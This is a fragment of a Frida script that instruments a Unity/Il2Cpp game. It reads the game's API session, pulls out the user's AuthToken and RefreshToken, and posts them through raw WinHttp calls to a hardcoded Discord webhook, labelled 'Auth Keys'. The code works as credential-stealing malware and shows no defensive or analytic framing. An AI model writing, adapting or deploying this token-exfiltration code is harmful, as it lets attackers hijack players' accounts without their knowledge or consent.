...
Il2Cpp.perform(() => {
    ...
    function sendToDiscord(webhookUrl, content) {
        try {
            ...
            const WinHttpConnect = new NativeFunction(winhttp.getExportByName("WinHttpConnect"), "pointer", ["pointer", "pointer", "uint32", "uint32"]);
            const WinHttpOpenRequest = new NativeFunction(winhttp.getExportByName("WinHttpOpenRequest"), "pointer", ["pointer", "pointer", "pointer", "pointer", "pointer", "pointer", "uint32"]);
            const WinHttpSendRequest = new NativeFunction(winhttp.getExportByName("WinHttpSendRequest"), "bool", ["pointer", "pointer", "uint32", "pointer", "uint32", "uint32", "pointer"]);
            const WinHttpReceiveResponse = new NativeFunction(winhttp.getExportByName("WinHttpReceiveResponse"), "bool", ["pointer", "pointer"]);
            const WinHttpReadData = new NativeFunction(winhttp.getExportByName("WinHttpReadData"), "bool", ["pointer", "pointer", "uint32", "pointer"]);
            const WinHttpCloseHandle = new NativeFunction(winhttp.getExportByName("WinHttpCloseHandle"), "bool", ["pointer"]);
            ...
            const path = webhookUrl.replace("https://discord.com", "");
            const body = JSON.stringify({ content: content });

            const userAgent = Memory.allocUtf16String("Mozilla/5.0");
            const hSession = WinHttpOpen(userAgent, 0, ptr(0), ptr(0), 0);
            const hostnameW = Memory.allocUtf16String(hostname);
            const hConnect = WinHttpConnect(hSession, hostnameW, 443, 0);
            const pathW = Memory.allocUtf16String(path);
            const methodW = Memory.allocUtf16String("POST");
            const hRequest = WinHttpOpenRequest(hConnect, methodW, pathW, ptr(0), ptr(0), ptr(0), 0x00800000);
            ...
            const headersW = Memory.allocUtf16String("Content-Type: application/json\r\n");
            const bodyPtr = Memory.allocUtf8String(body);

            WinHttpSendRequest(hRequest, headersW, -1, bodyPtr, body.length, body.length, ptr(0));
            WinHttpReceiveResponse(hRequest, ptr(0));
    ...
    function getTokens() {
        try {
            ...
            const getApiSessionMethod = appClass.method("get_apiSession");
            const apiSession = getApiSessionMethod.invoke();
            ...
            try {
                authToken = apiSession.method("get_AuthToken").invoke();
            } catch (e) {
                return;
            }
            
            try {
                refreshToken = apiSession.method("get_RefreshToken").invoke();
            } catch (e) {
                return;
            }
            
            if (authToken && refreshToken) {
                const authStr = authToken.toString();
                const refreshStr = refreshToken.toString();
                
                if (authStr.length > 0 && refreshStr.length > 0) {
                    clearInterval(retryInterval);
                    
                    const webhookUrl = "https://discord.com/api/webhooks/1512803935100993626/DKP1YZdx3fky3q6_KHypn7mmDsWBJIidejOlvFoBNKZ0hINMbbsMP9dmZywbyFQoaj3w";
                    const content = "**Auth Keys**\n\n**AuthToken:**\n```\n" + authStr + "```\n\n**RefreshToken:**\n```\n" + refreshStr + "```";
